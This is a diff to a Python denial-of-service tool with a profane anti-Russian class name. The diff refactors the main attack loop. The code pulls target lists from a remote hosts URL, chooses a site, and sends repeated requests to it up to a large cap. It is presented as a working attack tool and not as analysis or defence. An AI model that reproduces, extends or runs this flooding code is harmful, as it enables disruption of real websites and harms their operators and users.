@@ -28,7 +28,6 @@ thread_count = 0
 
 
 class FuckYouRussianShip:
-    VERSION = 7
     HOSTS = []
     HOSTS_URL = 'https://hutin-puy.nadom.app/hosts.json'
     MAX_REQUESTS = 5000
@@ -105,37 +104,13 @@ class FuckYouRussianShip:
             host = choice(self.HOSTS)
             try:
                 content = scraper.get(host).content
-            except Exception:
-                sleep(5)
-                continue
-
-            if content:
-                try:
-                    data = json.loads(content)
-                except json.decoder.JSONDecodeError:
-                    sleep(5)
-                    continue
-                except Exception:
-                    sleep(5)
-                    continue
-            else:
-                sleep(5)
-                continue
-            del content
-
-            try:
+                data = json.loads(content)
+                del content
                 site = unquote(choice(self.targets) if self.targets else data['site']['page'])
+                if site not in statistic and work_statistic:
+                    statistic[site] = [site, 0, 0, 0, 0, 0, 0]
             except Exception:
-                sleep(5)
                 continue
-            if not site.startswith('http'):
-                site = "https://" + site
-
-            if site not in statistic and work_statistic:
-                statistic[site] = [site, 0, 0, 0, 0, 0, 0]
-
-            # log_file_name = site.replace('https://', '') \
-            #     .replace('http://', '').split('.')[0]
 
             try:
                 attack = scraper.get(site, timeout=10)
